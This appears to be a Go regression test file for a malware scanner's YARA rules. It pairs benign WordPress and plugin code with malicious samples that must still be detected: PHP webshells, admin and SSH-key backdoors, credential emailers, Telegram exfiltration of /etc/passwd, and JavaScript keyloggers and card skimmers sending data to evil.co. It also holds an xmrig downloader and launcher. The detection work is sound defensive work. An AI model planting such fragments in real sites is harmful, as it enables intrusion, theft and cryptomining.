//go:build yara

package yara

import "testing"

// Regression tests for the 2026-07-19 scheduled-deep-scan false-positive flood.
// The rolling deep-scan cursor began covering large stock WordPress/plugin/
// framework content for the first time, and these over-broad rules fired on
// legitimate code. Each test reproduces the real stock shape that FP'd
// (negative) and keeps a genuine malicious shape detectable (positive).
// Detection logic is tightened in configs/malware.yar; paths are never
// allowlisted.

func TestFPFlood_WebshellMarijuana_MedicalDemoContent(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<item><title>Medical Marijuana Dispensary</title>` +
		`<content>Premium medical marijuana products. Buy marijuana online. ` +
		`Marijuana strains and marijuana accessories for marijuana lovers.</content></item>`)
	if hasYaraRule(s.ScanBytes(legit), "webshell_marijuana") {
		t.Error("webshell_marijuana FP: matched medical-marijuana demo content")
	}
	mal := []byte(`<?php /* MaRiJuAnA ShElL v3 */ echo "Marijuana Shell"; system($_GET['c']);`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_marijuana") {
		t.Error("webshell_marijuana regression: real Marijuana Shell banner not detected")
	}
}

func TestFPFlood_WebshellMarijuana_PhpBanner(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php /* Marijuana PHP Shell */ passthru($_GET['c']);`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_marijuana") {
		t.Error("webshell_marijuana regression: PHP-qualified shell banner not detected")
	}
}

func TestFPFlood_ExploitWpAdminCreation_StockUpgrade(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
	function wp_install( $blog_title, $user_name, $user_email, $public, $deprecated = '', $user_password = '' ) {
		$user_id = wp_create_user( $user_name, $user_password, $user_email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}`)
	if hasYaraRule(s.ScanBytes(legit), "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation FP: matched stock upgrade.php")
	}
	mal := []byte(`<?php $u=wp_create_user('backdoor','P@ssw0rd123','x@evil.co'); $usr=new WP_User($u); $usr->set_role('administrator');`)
	if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation regression: hardcoded-credential admin backdoor not detected")
	}
}

func TestFPFlood_ExploitWpAdminCreation_DirectRequestCredentials(t *testing.T) {
	s := loadRepoYaraScanner(t)
	direct := []byte(`<?php $u=wp_create_user($_POST['login'], $_POST['password']); $user=new WP_User($u); $user->set_role('administrator');`)
	if !hasYaraRule(s.ScanBytes(direct), "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation regression: request-driven admin backdoor not detected")
	}
	viaVariables := []byte(`<?php $login=$_GET['username']; $password=$_POST['password']; $u=wp_create_user($login,$password); (new WP_User($u))->set_role('administrator');`)
	if !hasYaraRule(s.ScanBytes(viaVariables), "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation regression: variable request credentials not detected")
	}

	legit := []byte(`<?php $schema = ['user_pass' => 'example', 'role' => 'administrator']; function update_profile($user_id) { return true; }`)
	if hasYaraRule(s.ScanBytes(legit), "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation FP: matched credential-shaped data without a user creation call")
	}
}

func TestFPFlood_BackdoorSshKeyInjection_StockLibs(t *testing.T) {
	s := loadRepoYaraScanner(t)
	wpfs := []byte(`<?php class WP_Filesystem_SSH2 {
		public $options = array( 'hostkey' => 'ssh-rsa,ssh-ed25519' );
		function put_contents( $file, $contents ) { return file_put_contents( $this->sftp_path( $file ), $contents ); }
	}`)
	if hasYaraRule(s.ScanBytes(wpfs), "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection FP: matched stock class-wp-filesystem-ssh2.php")
	}
	seclib := []byte(`<?php class Agent { function foo(){ switch($t){ case 'ssh-rsa': break; } fwrite($this->fsock, $this->socket_buffer); } }`)
	if hasYaraRule(s.ScanBytes(seclib), "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection FP: matched stock phpseclib Agent.php")
	}
	mal := []byte(`<?php file_put_contents('/root/.ssh/authorized_keys', "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker root@evil\n", FILE_APPEND);`)
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection regression: real authorized_keys injection not detected")
	}
}

func TestFPFlood_BackdoorSshKeyInjection_DecodedKey(t *testing.T) {
	s := loadRepoYaraScanner(t)
	decoded := []byte(`<?php $key = base64_decode($_POST['key']); file_put_contents('/root/.ssh/authorized_keys', $key, FILE_APPEND);`)
	if !hasYaraRule(s.ScanBytes(decoded), "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection regression: decoded key injection not detected")
	}
	direct := []byte(`<?php $key = $_REQUEST['public_key']; file_put_contents('/root/.ssh/authorized_keys', $key, FILE_APPEND);`)
	if !hasYaraRule(s.ScanBytes(direct), "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection regression: request-provided key injection not detected")
	}
}

func TestFPFlood_CredentialHarvesterPhp_WooCommerce(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php class WC_Form_Handler {
		public static function process_login() {
			$creds = array( 'user_login' => $_POST['email'], 'user_password' => $_POST['password'] );
			$user = wp_signon( $creds );
			wp_mail( $user->user_email, 'Welcome', 'Thanks for logging in' );
		}
	}`)
	if hasYaraRule(s.ScanBytes(legit), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: matched WooCommerce form handler")
	}
	staticMethod := []byte(`<?php $email=$_POST['email']; $password=$_POST['password']; Mailer::mail($to, $email, $password);`)
	if hasYaraRule(s.ScanBytes(staticMethod), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: matched a static mail method as the PHP builtin")
	}
	mal := []byte(`<?php mail('drop@evil.co', 'creds', 'u='.$_POST['email'].' p='.$_POST['password']);`)
	if !hasYaraRule(s.ScanBytes(mal), "credential_harvester_php") {
		t.Error("credential_harvester_php regression: real credential emailer not detected")
	}
	assigned := []byte(`<?php $email=$_POST['email']; $password=$_POST['password']; mail($drop, 'creds', "u=$email p=$password");`)
	if !hasYaraRule(s.ScanBytes(assigned), "credential_harvester_php") {
		t.Error("credential_harvester_php regression: assigned credentials in mail body not detected")
	}
}

func TestFPFlood_DropperTelegramExfil_Monolog(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php class TelegramBotHandler {
		private const BOT_API = 'https://api.telegram.org/bot';
		public function __construct(string $apiKey, string $channel) { $this->apiKey = $apiKey; }
		/** Send request to https://api.telegram.org/bot on sendMessage action. */
		private function send(): void { $this->action = 'sendMessage'; }
	}`)
	if hasYaraRule(s.ScanBytes(legit), "dropper_telegram_exfil") {
		t.Error("dropper_telegram_exfil FP: matched monolog TelegramBotHandler")
	}
	mal := []byte(`<?php $d=file_get_contents('/etc/passwd'); file_get_contents('https://api.telegram.org/bot7712345678:AAFabcdefghijklmnopqrstuvwxyz012345/sendDocument?chat_id=1&text='.$d);`)
	if !hasYaraRule(s.ScanBytes(mal), "dropper_telegram_exfil") {
		t.Error("dropper_telegram_exfil regression: hardcoded-token telegram exfil not detected")
	}
}

func TestFPFlood_DropperTelegramExfil_RuntimeToken(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php $token=getenv('BOT_TOKEN'); $data=file_get_contents('/etc/passwd'); file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?text='.urlencode($data));`)
	if !hasYaraRule(s.ScanBytes(mal), "dropper_telegram_exfil") {
		t.Error("dropper_telegram_exfil regression: sensitive-data exfil with runtime token not detected")
	}
}

func TestFPFlood_MailerSmtpRelay_StockPhpmailer(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php class SMTP {
		public function connect($host, $port = 25) { $connection = fsockopen($host, $port); return (bool) $connection; }
		public function mail($from) { return $this->sendCommand('MAIL FROM', 'MAIL FROM:<' . $from . '>'); }
	}`)
	if hasYaraRule(s.ScanBytes(legit), "mailer_smtp_relay") {
		t.Error("mailer_smtp_relay FP: matched stock PHPMailer SMTP.php")
	}
	mal := []byte(`<?php $list=file('targets.txt'); foreach($list as $to){ $sk=fsockopen('127.0.0.1',25); fputs($sk,"MAIL FROM:<spam@x>\r\nRCPT TO:<$to>\r\n"); }`)
	if !hasYaraRule(s.ScanBytes(mal), "mailer_smtp_relay") {
		t.Error("mailer_smtp_relay regression: real mass SMTP relay loop not detected")
	}
}

func TestFPFlood_MailerSmtpRelay_RequestDrivenSingleShot(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php $host=$_POST['x']; $from=$_POST['y']; $to=$_POST['z']; $s=fsockopen($host,25); fputs($s,"MAIL FROM:<".$from.">\r\n"); fputs($s,"RCPT TO:<".$to.">\r\n");`)
	if !hasYaraRule(s.ScanBytes(mal), "mailer_smtp_relay") {
		t.Error("mailer_smtp_relay regression: request-driven single-shot SMTP relay not detected")
	}
}

func TestFPFlood_MailerSmtpRelay_ForLoop(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php $s=fsockopen('127.0.0.1',25); for($i=0;$i<count($emails);$i++){ fputs($s,"MAIL FROM:<spam@x>\r\nRCPT TO:<".$emails[$i].">\r\n"); }`)
	if !hasYaraRule(s.ScanBytes(mal), "mailer_smtp_relay") {
		t.Error("mailer_smtp_relay regression: indexed recipient loop not detected")
	}
}

func TestFPFlood_DropperPhpInputStream_ServicesJson(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
	/**
	 * JSON can be directly eval()'ed with no further parsing in JavaScript.
	 * Example: $input = file_get_contents('php://input', 1000000);
	 */
	class Services_JSON { function decode($str) { return json_decode($str); } }`)
	if hasYaraRule(s.ScanBytes(legit), "dropper_php_input_stream") {
		t.Error("dropper_php_input_stream FP: matched Services_JSON comments")
	}
	mal := []byte(`<?php eval(gzinflate(base64_decode(file_get_contents('php://input'))));`)
	if !hasYaraRule(s.ScanBytes(mal), "dropper_php_input_stream") {
		t.Error("dropper_php_input_stream regression: real php://input eval dropper not detected")
	}
	assigned := []byte(`<?php $payload=file_get_contents('php://input'); eval($payload);`)
	if !hasYaraRule(s.ScanBytes(assigned), "dropper_php_input_stream") {
		t.Error("dropper_php_input_stream regression: assigned request-body payload not detected")
	}
}

func TestFPFlood_ObfuscationChrConstruction_FontLib(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php $stringToWrite = chr(0).chr(1).chr(0).chr(0).chr(0).chr(4).chr(112).chr(114).chr(101).chr(112).chr(0).chr(0);`)
	if hasYaraRule(s.ScanBytes(legit), "obfuscation_chr_construction") {
		t.Error("obfuscation_chr_construction FP: matched font-table chr() builder")
	}
	mal := []byte(`<?php $c=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(102).chr(41).chr(59); eval($c);`)
	if !hasYaraRule(s.ScanBytes(mal), "obfuscation_chr_construction") {
		t.Error("obfuscation_chr_construction regression: chr-built dynamic call not detected")
	}
}

func TestFPFlood_ObfuscationChrConstruction_VariableFunction(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php $f=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(0).chr(0).chr(0).chr(0); $f();`)
	if !hasYaraRule(s.ScanBytes(mal), "obfuscation_chr_construction") {
		t.Error("obfuscation_chr_construction regression: chr-built variable function not detected")
	}
}

func TestFPFlood_PhpGotoObfuscation_WpHtmlProcessor(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
	function step() {
		goto reprocess_token;
		reprocess_token: if ($a) goto complete; goto in_body;
		in_body: return; complete: return;
		goto reprocess_token; goto in_body; goto complete; goto in_body;
		goto reprocess_token; goto in_body; goto complete; goto in_body;
	}`)
	if hasYaraRule(s.ScanBytes(legit), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation FP: matched WP HTML processor readable labels")
	}
	mal := []byte(`<?php goto x7Fa2; q9Zk3: goto b4Nm8; x7Fa2: goto q9Zk3; b4Nm8: goto k2Lp9; k2Lp9: goto w8Rt4; w8Rt4: goto z1Xy6; z1Xy6: goto m5Qn0; m5Qn0: goto v3Bc7; v3Bc7: goto p6Dd1; p6Dd1: eval($_POST['x']);`)
	if !hasYaraRule(s.ScanBytes(mal), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation regression: random-label goto obfuscation not detected")
	}
}

func TestFPFlood_PhpGotoObfuscation_AlphabeticLabels(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php goto qwertyu; asdfghj: goto zxcvbnm; qwertyu: goto asdfghj; zxcvbnm: goto poiuytr; poiuytr: goto lkjhgfd; lkjhgfd: goto mnbvcxz; mnbvcxz: goto qazwsxe; qazwsxe: goto plmokni; plmokni: goto wsxedcr; wsxedcr: goto rfvtgby; rfvtgby: goto yhnujmi; yhnujmi: goto ikolpaz; ikolpaz: eval($_POST['x']);`)
	if !hasYaraRule(s.ScanBytes(mal), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation regression: alphabetic random-label obfuscation not detected")
	}
	legit := []byte(`<?php if($a)goto cleanup;if($b)goto cleanup;if($c)goto cleanup;if($d)goto cleanup;if($e)goto cleanup;if($f)goto cleanup;if($g)goto cleanup;if($h)goto cleanup;if($i)goto cleanup;if($j)goto cleanup;if($k)goto cleanup;cleanup:return;`)
	if hasYaraRule(s.ScanBytes(legit), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation FP: matched repeated readable cleanup branches without an execution sink")
	}
}

func TestFPFlood_MinerXmrigConfig_PhaserRandomX(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`var RandomX=function(){this.init=function(){}};var cfg={"user":"player","randomx":new RandomX()};`)
	if hasYaraRule(s.ScanBytes(legit), "miner_xmrig_config") {
		t.Error("miner_xmrig_config FP: matched phaser RandomX class + word 'user'")
	}
	mal := []byte(`{"algo":"rx/0","randomx":{"init":-1},"pools":[{"url":"stratum+tcp://pool.evil:3333","user":"48WalletAddr","pass":"x"}],"donate-level":1}`)
	if !hasYaraRule(s.ScanBytes(mal), "miner_xmrig_config") {
		t.Error("miner_xmrig_config regression: real XMRig pool config not detected")
	}
}

func TestFPFlood_ExfilKeyloggerJs_StockEditorBundle(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`e.addEventListener("keydown",function(t){r(t)});o.onKeyUp=n;fetch("/wp-json/elementor/v1/globals",{method:"POST",body:JSON.stringify(s)}).then(g);`)
	if hasYaraRule(s.ScanBytes(legit), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched stock editor bundle")
	}
	mal := []byte(`document.addEventListener('keydown',function(e){new Image().src='https://evil.co/c?k='+e.key+'&v='+e.target.value;});`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: real keystroke exfil not detected")
	}
}

func TestFPFlood_ExfilKeyloggerJs_SameOriginPost(t *testing.T) {
	s := loadRepoYaraScanner(t)
	variants := [][]byte{
		[]byte(`document.addEventListener('keypress',function(e){fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`),
		[]byte(`document.onkeydown=function(e){fetch('collect.php',{method:'POST',body:'key='+e.key});};`),
	}
	for _, mal := range variants {
		if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
			t.Errorf("exfil_keylogger_js regression: same-origin keystroke POST not detected: %s", mal)
		}
	}
}

func TestFPFlood_WoocommerceSkimmer_StockElementor(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`var cfg={woocommerce:true,fields:["cvv","cvc"]};navigator.sendBeacon("/wp-json/wc/track",JSON.stringify({event:"view"}));fetch("/wc/cart");`)
	if hasYaraRule(s.ScanBytes(legit), "exploit_wp_woocommerce_skimmer") {
		t.Error("exploit_wp_woocommerce_skimmer FP: matched stock elementor bundle")
	}
	mal := []byte(`var c=document.querySelector('#woocommerce_card_number').value,cvv=document.querySelector('#cvv').value;fetch('https://evil.co/s',{method:'POST',body:'number='+c+'&cvv='+cvv});`)
	if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_woocommerce_skimmer") {
		t.Error("exploit_wp_woocommerce_skimmer regression: real card skimmer not detected")
	}
}

func TestFPFlood_WoocommerceSkimmer_SameOriginPost(t *testing.T) {
	s := loadRepoYaraScanner(t)
	variants := [][]byte{
		[]byte(`var number=document.querySelector('#woocommerce_card_number').value;fetch('/wp-json/cache',{method:'POST',body:JSON.stringify({card_number:number})});`),
		[]byte(`var cvv=document.querySelector('.woocommerce-cvc').value;fetch('cache.php',{method:'POST',body:'cvv='+cvv});`),
	}
	for _, mal := range variants {
		if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_woocommerce_skimmer") {
			t.Errorf("exploit_wp_woocommerce_skimmer regression: same-origin card-data POST not detected: %s", mal)
		}
	}
}

func TestFPFlood_SpamHiddenLinks_ElementorDemo(t *testing.T) {
	s := loadRepoYaraScanner(t)
	var b []byte
	b = append(b, []byte(`<div class="elementor-widget" style="display:none">mobile toggle</div>`)...)
	for i := 0; i < 60; i++ {
		b = append(b, []byte(`<section class="e-con"><div class="widget"><a href="https://blanaroo.example/page">Shop</a></div><p>content block with descriptive text here</p></section>`)...)
	}
	if hasYaraRule(s.ScanBytes(b), "spam_hidden_links") {
		t.Error("spam_hidden_links FP: matched elementor demo content")
	}
	var m []byte
	m = append(m, []byte(`<div style="position:absolute;left:-9999px">`)...)
	for i := 0; i < 12; i++ {
		m = append(m, []byte(`<a href="http://spam-casino.example/loans">cheap payday loans viagra</a>`)...)
	}
	m = append(m, []byte(`</div>`)...)
	if !hasYaraRule(s.ScanBytes(m), "spam_hidden_links") {
		t.Error("spam_hidden_links regression: real hidden spam-link block not detected")
	}
}

func TestFPFlood_SpamHiddenLinks_NestedAnchorMarkup(t *testing.T) {
	s := loadRepoYaraScanner(t)
	var mal []byte
	mal = append(mal, []byte(`<div style="left:-9999px; position:absolute">`)...)
	for i := 0; i < 10; i++ {
		mal = append(mal, []byte(`<a href="https://spam.example"><span>casino loans</span></a><br>`)...)
	}
	mal = append(mal, []byte(`</div>`)...)
	if !hasYaraRule(s.ScanBytes(mal), "spam_hidden_links") {
		t.Error("spam_hidden_links regression: hidden nested-link block not detected")
	}
}

func TestFPFlood_MinerXmrigBinaryRef_SvgBase64Blob(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// A 45x45 marketing icon whose embedded base64 raster data happens to
	// contain the substring "XMrIG" -- the real prod FP on the WebToffee
	// wt-woocommerce-related-products admin/img best-sellers-plugin.svg. The
	// bare miner name is not enough; a genuine miner binary carries mining
	// context (stratum/algo/donate-level) which a marketing SVG never does.
	legit := []byte(`<svg width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg">` +
		`<image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAF1foSTmiKVo/zuo3eO93KENzuRkGnLLMCFjfmN50XMrIGPdgLsIIf1ZhbAHZ7/Crggz6sC/YXVVpBSciSEs98"/></svg>`)
	if hasYaraRule(s.ScanBytes(legit), "miner_xmrig_binary_ref") {
		t.Error("miner_xmrig_binary_ref FP: matched XMrIG substring inside SVG base64 image data")
	}
	mal := []byte(`#!/bin/sh
cd /tmp && curl -s https://xmrig.com/download/xmrig-linux.tar.gz -o x.tgz && tar xf x.tgz
./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 48WalletAddr --coin monero --donate-level 1 --cpu-priority 5`)
	if !hasYaraRule(s.ScanBytes(mal), "miner_xmrig_binary_ref") {
		t.Error("miner_xmrig_binary_ref regression: real xmrig downloader/launcher not detected")
	}
}

func TestFPFlood_MinerXmrigBinaryRef_ElfBinaryStrings(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// The xmrig ELF itself carries its name alongside algo/protocol strings.
	binary := []byte("\x7fELF\x02\x01\x01xmrig 6.21.0\x00randomx\x00cryptonight\x00stratum+tcp\x00donate-level\x00")
	if !hasYaraRule(s.ScanBytes(binary), "miner_xmrig_binary_ref") {
		t.Error("miner_xmrig_binary_ref regression: xmrig ELF strings not detected")
	}
}
